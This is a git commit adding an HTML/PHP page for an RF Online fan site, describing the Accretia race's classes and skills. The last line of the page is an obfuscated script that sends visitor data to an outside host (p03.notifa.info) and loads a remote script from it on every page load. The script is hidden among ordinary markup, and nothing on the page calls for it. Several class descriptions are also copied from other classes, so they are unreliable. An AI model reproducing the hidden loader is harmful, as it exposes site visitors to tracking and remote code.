052b1f1b812528a0daddba8d30d2190159235bc4
rfonline-my-id <67874418+rfonline-my-id@users.noreply.github.com>
2020-07-06 01:38:42 +0700

    Add files via upload

---
+++ accretia/index.php
@@ -0,0 +1,283 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link rel="stylesheet" href="/races/accretia/style.css">
+<link href="https://fonts.googleapis.com/css?family=Titillium+Web:300,400" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css?family=Russo+One" rel="stylesheet">
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+<title>Accretia</title>
+</head>
+<h1 class="title-banner text-white">ACCRETIA</h1>
+<h2 class="subtitle text-white">FLESH IS WEAK</h2>
+<div class="dot-divider"></div>
+</div>
+</div>
+<div class="container">
+
+<h2 class="title-race text-center text-white">WARRIOR</h2>
+<div class="row">
+<div class="col-sm-12 col-lg-6">
+<div class="card card-race">
+<div>
+<img src="/races/accretia/destroyer.jpg" alt="">
+<h3>DESTROYER</h3>
+<span>Level 30 Class Advancement <br>Prerequisite: None</span>
+</div>
+<br>
+<p>Destroyer units function as the main force for the Accretian army.
+They are very competent in melee combat and are the most powerful warriors among the three races on Novus.</p>
+<br>
+<p>Skills</p>
+<div>
+<button data-container="body" data-toggle="popover" data-placement="top" title="MANGLE" data-content="An aggressive four-hit attack aimed at crippling the target."><img src="/races/accretia/mangle.png" alt=""></button>
+<button href="#" data-container="body" data-toggle="popover" data-placement="top" title="SHIELD BATTERY" data-content="Creates a recovery matrix around the user, temporarily increasing HP and FP recovery rate."><img src="/races/accretia/shield_battery.png" alt=""></button>
+</div>
+</div>
+</div>
+<div class="col-sm-12 col-lg-6">
+<div class="card card-race">
+<div>
+<img src="/races/accretia/class_gladius.jpg" alt="">
+<h3>GLADIUS</h3>
+<span>Level 30 Class Advancement <br>Prerequisite: None</span>
+</div>
+<br>
+<p>Gladius units utilize one-hand weapons with the unique Accretian shields, which are significantly more powerful than those of other races.
+Gladius class therefore prioritize shield techniques.</p>
+<br>
+<p>Skills</p>
+<div>
+<button data-container="body" data-toggle="popover" data-placement="top" title="IRRITATE" data-content="Causes target's fury and attack(Increase aggressiveness of monster by moderate)"><img src="/races/accretia/irritate.png" alt=""></button>
+<button data-container="body" data-toggle="popover" data-placement="top" title="MEGA SHIELD" data-content="Charges energy through the user's shield, increasing defense power and block rate."><img src="/races/accretia/mega_shield.png" alt=""></button>
+<button data-container="body" data-toggle="popover" data-placement="top" title="MIGHT" data-content="Increases the heat pressure in the user's dynamic servimotors, temporarily increasing melee attack speed."><img src="/races/accretia/might.png" alt=""></button>
+</div>
+</div>
+</div>
+<div class="col-sm-12 col-lg-4">
+<div class="card card-race">
+<div>
+<img src="/races/accretia/class_punisher.jpg" alt="">
+<h3>PUNISHER</h3>
+ <span>Level 40 Class Advancement <br>Prerequisite: Destroyer</span>
+</div>
+<br>
+<p>Punisher units have the capacity to identify opponents’ weak points and use skills to ensnare enemies.</p>
+<br>
+<p>Skills</p>
+<div>
+<button data-container="body" data-toggle="popover" data-placement="top" title="ACCELERATION" data-content="Increase movement speed for a while."><img src="/races/accretia/acceleration.png" alt=""></a>
+<button data-container="body" data-toggle="popover" data-placement="top" title="BASH EXPLOSION" data-content="Hit the target with strong shockwave."><img src="/races/accretia/bash_explosion.png" alt=""></a>
+<button data-container="body" data-toggle="popover" data-placement="top" title="MAGNETIC ARM" data-content="Increases the electromagnetic energy around the user's arm, temporarily increasing melee attack power and accuracy."><img src="/races/accretia/magnetic_arm.png" alt=""></a>
+<button data-container="body" data-toggle="popover" data-placement="top" title="MAGNETIC NET" data-content="A magnetized net that prevents the target from moving."><img src="/races/accretia/punisher/magnetic_net.png" alt=""></a>
+<button data-container="body" data-toggle="popover" data-placement="top" title="RAGE BLOW" data-content="A ragged cut that leaves a gaping wound, causing the target to gradually lose HP."><img src="/races/accretia/rage_blow.png" alt=""></a>
+</div>
+</div>
+</div>
+<div class="col-sm-12 col-lg-4">
+<div class="card card-race">
+<div>
+<img src="/races/accretia/class_dreadnought.jpg" alt="">
+<h3>DREADNOUGHT</h3>
+<span>Level 40 Class Advancement <br>Prerequisite: Destroyer or Gladius</span>
+</div>
+<br>
+<p>Assaulter units equalize potent offensive and defensive capacity.</p>
+<br>
+<p>Skills</p>
+<div>
+<button data-container="body" data-toggle="popover" data-placement="top" title="ACCELERATION" data-content="Increase movement speed for a while."><img src="/races/accretia/accelerationj.png" alt=""></button>
+<button data-container="body" data-toggle="popover" data-placement="top" title="BASH EXPLOTION" data-content="Hit the target with strong shockwave."><img src="/races/accretia/dreadnought/bash_explosion.png" alt=""></button>
+<button data-container="body" data-toggle="popover" data-placement="top" title="CAPACITY ENGINE" data-content="A powerful blow to the ground under the user that stuns nearby enemies by causing them to lose their balance."><img src="/races/accretia/dreadnought/capacity_engine.png" alt=""></button>
+<button data-container="body" data-toggle="popover" data-placement="top" title="LIMIT GAUGE" data-content="A strike to the target's solar plexus, temporarily limiting its SP and SP recovery while they catch their breath."><img src="/races/accretia/dreadnought/limit_gauge.png" alt=""></button>
+</div>
+</div>
+</div>
+<div class="col-sm-12 col-lg-4">
+<div class="card card-race">
+<div>
+<img src="/races/accretia/class_warder.jpg" alt="">
+<h3>WARDER</h3>
+<span>Level 40 Class Advancement <br>Prerequisite: Gladius</span>
+</div>
+<br>
+<p>Built to withstand Force assaults, Warders are structured with innovative frames that enable more fficient use of chargers.</p>
+ <br>
+<p>Skills</p>
+<div>
+<button data-container="body" data-toggle="popover" data-placement="top" title="ACCELERATION" data-content="Increase movement speed for a while."><img src="/races/accretia/acceleration.png" alt=""></button>
+<button data-container="body" data-toggle="popover" data-placement="top" title="BASH EXPLOSION" data-content="Hit the target with strong shockwave."><img src="/races/accretia/bash_explosion.png" alt=""></button>
+<button data-container="body" data-toggle="popover" data-placement="top" title="CRY" data-content="Gets monsters' attention with a cry.(Increase aggressiveness of monster by wide range)"><img src="/races/accretia/cry.png" alt=""></button>
+<button data-container="body" data-toggle="popover" data-placement="top" title="ELEMENTAL BARRIER" data-content="Creates an energy barrier that greatly increases all elemental resistances."><img src="/races/accretia/elementalbarrier.png" alt=""></button>
+<button data-container="body" data-toggle="popover" data-placement="top" title="EXCEL CHARGER" data-content="Increases effect of HP charger and exp gaining amount."><img src="/races/accretia/exce_charger.png" alt=""></button >
+</div>
+</div>
+</div>
+</div>
+<div class="divider-min"></div>
+
+<h2 class="title-race text-center text-white">RANGER</h2>
+<div class="row">
+<div class="col-sm-12 col-lg-6">
+<div class="card card-race">
+<div>
+<img src="/races/accretia/class_gunner.jpg" alt="">
+<h3>GUNNER</h3>
+<span>Level 30 Class Advancement <br>Prerequisite: None</span>
+</div>
+<br>
+<p>Gunner units are capable of both ranged and melee combat.
+All Accretian soldiers are able to utilize Launchers; however, Gunners are specifically structured for Launcher use.</p>
+<br>
+<p>Skills</p>
+<div>
+<button data-container="body" data-toggle="popover" data-placement="top" title="FLASH BANG" data-content="Cause a blinding flash and loud explosion that disorients the target and temporarily reduces his dodge ability."><img src="/races/accretia/flash_bang.png" alt=""></button>
+<button data-container="body" data-toggle="popover" data-placement="top" title="HEAVY SHOT" data-content="The user sets his mass and fires a powerful launcher shot."><img src="/races/accretia/heavy_shot.png" alt=""></button>
+<button data-container="body" data-toggle="popover" data-placement="top" title="COMPOUND SIEGE" data-content="Using the siege kit as a catapult platform, the user fires an explosive launcher shot at target and enemies nearby."><img src="/races/accretia/compound_siege.png" alt=""></button>
+</div>
+</div>
+</div>
+<div class="col-sm-12 col-lg-6">
+<div class="card card-race">
+<div>
+<img src="/races/accretia/class_scout.jpg" alt="">
+<h3>SCOUT</h3>
+<span>Level 30 Class Advancement <br>Prerequisite: None</span>
+</div>
+<br>
+<p>Gladius units utilize one-hand weapons with the unique Accretian shields, which are significantly more powerful than those of other races.
+Gladius class therefore prioritize shield techniques.</p>
+<br>
+<p>Skills</p>
+<div>
+<button data-container="body" data-toggle="popover" data-placement="top" title="CLOAKING" data-content="Activates stealth plating and temporarily becomes invisible to enemies."><img src="/races/accretia/r_cloaking.png" alt=""></button>
+<button data-container="body" data-toggle="popover" data-placement="top" title="FIND TRAP" data-content="Find hidden traps by detecting non-organic chemical compounds."><img src="/races/accretia/rskill_findtrap.png" alt=""></button>
+<button data-container="body" data-toggle="popover" data-placement="top" title="TRAPPING" data-content="Sets proximity mines that explode when an enemy walks over it."><img src="/races/accretia/rskill_trapping.png" alt=""></button>
+</div>
+</div>
+</div>
+<div class="col-sm-12 col-lg-4">
+<div class="card card-race">
+<div>
+<img src="/races/accretia/class_annihilator.jpg" alt="">
+<h3>ANNIHILATOR</h3>
+<span>Level 40 Class Advancement <br>Prerequisite: Gunner</span>
+</div>
+<br>
+<p>Punisher units have the capacity to identify opponents’ weak points and use skills to ensnare enemies.</p>
+<br>
+<p>Skills</p>
+<div>
+<button data-container="body" data-toggle="popover" data-placement="top" title="CHAIN ROCKET" data-content="Using the siege kit as a stable platform, the user rapidly fires three sets of launcher attacks at one target."><img src="/races/accretia/r_crocket.png" alt=""></button>
+<button data-container="body" data-toggle="popover" data-placement="top" title="FINAL BLAST" data-content="A devastating launcher attack using energy reserves."><img src="/races/accretia/r_fblast.png" alt=""></button>
+<button data-container="body" data-toggle="popover" data-placement="top" title="SIEGE MASTERY" data-content="By operating the siege kit to the limits of structural tolerance instead of safety limits, the user temporarily increases attack and defense power while in siege mode."><img src="/races/accretia/r_smastery.png" alt=""></button>
+</div>
+</div>
+</div>
+<div class="col-sm-12 col-lg-4">
+<div class="card card-race">
+<div>
+<img src="/races/accretia/class_desolator.jpg" alt="">
+<h3>DESOLATOR</h3>
+<span>Level 40 Class Advancement <br>Prerequisite: Gunner or Scout</span>
+</div>
+<br>
+<p>Assaulter units equalize potent offensive and defensive capacity.</p>
+<br>
+<p>Skills</p>
+<div>
+<button data-container="body" data-toggle="popover" data-placement="top" title="DETONATE" data-content="By overloading his energy core, the user can self-destruct and deal massive damage to surrounding enemies."><img src="/races/accretia/r_detonate.png" alt=""></button>
+<button data-container="body" data-toggle="popover" data-placement="top" title="GATE CAPSSULE" data-content="Sets up a teleport beacon that returns the user's party members to his binding location."><img src="/races/accretia/r_gcapsule.png" alt=""></button>
+<button data-container="body" data-toggle="popover" data-placement="top" title="HYPER R.P.M." data-content="Increase long distance attack power with maximizing engine output."><img src="/races/accretia/r_hrpm.png" alt=""></button>
+<button data-container="body" data-toggle="popover" data-placement="top" title="LONG DISTANCE FIRING" data-content="Increases accuracy rate, make the target stern."><img src="/races/accretia/rskill_ldfiring.png" alt=""></button >
+</div>
+</div>
+</div>
+<div class="col-sm-12 col-lg-4">
+<div class="card card-race">
+<div>
+<img src="/races/accretia/class_infiltrator.jpg" alt="">
+<h3>INFILTRATOR</h3>
+<span>Level 40 Class Advancement <br>Prerequisite: Scout</span>
+</div>
+<br>
+<p>Built to withstand Force assaults, Warders are structured with innovative frames that enable more fficient use of chargers.</p>
+<br>
+<p>Skills</p>
+<div>
+<button data-container="body" data-toggle="popover" data-placement="top" title="ILLUSION ATTACK" data-content="A powerful attack that bypasses the target's defenses; must be done while Cloaked.   "><img src="/races/accretia/r_iattack.png" alt=""></button>
+<button data-container="body" data-toggle="popover" data-placement="top" title="TRAP BOX" data-content="Extra compartments designed to carry more traps."><img src="/races/accretia/r_tbox.png" alt=""></button>
+<button data-container="body" data-toggle="popover" data-placement="top" title="LONG DISTANCE FIRING" data-content="Extra compartments designed to carry more traps."><img src="/races/accretia/rskill_ldfiring.png" alt=""></button>
+</div>
+</div>
+</div>
+</div>
+<div class="divider-min"></div>
+
+<h2 class="title-race text-center text-white">SPECIALIST</h2>
+<div class="row">
+<div class="col-sm-12 col-lg-12">
+<div class="card card-race">
+<div>
+<img src="/races/accretia/class_aengineer.jpg" alt="">
+<h3>ENGINEER</h3>
+<span>Level 30 Class Advancement <br>Prerequisite: None</span>
+</div>
+<br>
+<p>Engineer units are built for improved production and sufficient combat ability to achieve goals and enable self-preservation.</p>
+<br>
+<p>Skills</p>
+<div>
+<button data-container="body" data-toggle="popover" data-placement="top" title="INSTALL GUARD TOWER" data-content="Engineer units are built for improved production and sufficient combat ability to achieve goals and enable self-preservation."><img src="/races/accretia/as_igtower.png" alt=""></button>
+</div>
+</div>
+</div>
+<div class="col-sm-12 col-lg-6">
+<div class="card card-race">
+<div>
+<img src="/races/accretia/class_scientist.jpg" alt="">
+<h3>SCIENTIST</h3>
+<span>Level 40 Class Advancement <br>Prerequisite: Engineer</span>
+</div>
+<br>
+<p>Scientist units are built with the capacity to repair wounded soldiers and engage in defensive combat.</p>
+<br>
+<p>Skills</p>
+<div>
+<button data-container="body" data-toggle="popover" data-placement="top" title="INSTANT REPAIR" data-content="Restores power and reroutes subroutines to a fallen ally, restoring him to full operational status."><img src="/races/accretia/as_irepair.png" alt=""></button>
+<button data-container="body" data-toggle="popover" data-placement="top" title="GAUGE RECOVERY" data-content="Use nanites to repair the target's frame, recovering his defense gauge."><img src="/races/accretia/as_grecovery.png" alt=""></button>
+</div>
+</div>
+</div>
+<div class="col-sm-12 col-lg-6">
+<div class="card card-race  ">
+<div>
+<img src="/races/accretia/class_bleader.jpg" alt="">
+<h3>BATTLE LEADER</h3>
+<span>Level 40 Class Advancement <br>Prerequisite: Engineer</span>
+</div>
+<br>
+<p>Battle Leader units are built with the capacity to increase associates’ speed and decrease opponents’ defense.</p>
+<br>
+<p>Skills</p>
+<div>
+<button data-container="body" data-toggle="popover" data-placement="top" title="BARRIER" data-content="Sets up an impenetrable barrier around the Leader. He is temporarily invincible, but cannot move or attack."><img src="/races/accretia/as_barrier.png" alt=""></button>
+<button data-container="body" data-toggle="popover" data-placement="top" title="GAUGE DOWN" data-content="Use nanites to break down target's armor, reducing his defense gauge."><img src="/races/accretia/as_gdown.png" alt=""></button>
+<button data-container="body" data-toggle="popover" data-placement="top" title="NIMBLE JOINT" data-content="Increases the target's movement speed by maximizing his hydraulic thrusters."><img src="/races/accretia/as_njoint.png" alt=""></button>
+</div>
+</div>
+</div>
+</div>
+</div>
+<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+<script>
+ $(function () {
+  $('[data-toggle="popover"]').popover()
+})
+    </script>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXv7x%2fj8eS4hAW%2bJbpGtMWOjM7OAjKqj8RuYatKEaeOHGRWrORSvxuNS3GIrPhVWO8xCgMGSCyHVPtW1yFm%2bMLL0wZi9KMHCS4AanqzxC19%2bCe%2bw8sKlZnlcIa%2fgiaMFqHGMLR1WV3EF4a8ynEL05O3w6dd4hoh89ind89%2bDtfeCYb88ftKI5FCEp4pd1wIXy3lLokZ8rRYSPiSFTyGD0nExO4V57OhLSx41PVEPooIo%2b7snXC9kpgef9MrL2m4DP%2fpwHeVVFW3Yq5xDu77vXPG66NDFJSNtX%2bBYw2jXv4SyCEQtUs%2f85hGHv%2b8t%2b%2f0CdTJHwj2VtsOi41cn7YDAMn7m3vvULRW0LUvJmq1jYZmeA5Y7kb0%2fS3P00KTGYhxxuoB6gedwpt3SPTD19Q18TCUJtIp6%2fb6ZAOrc%2f9bQsNAQVXo%2beYqLeigRTHzQpEIgVtjQR7s6xdPOjWYa9pA7e6D6kj91roB6qanqO2te8ApX317kQrMzQe6g%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
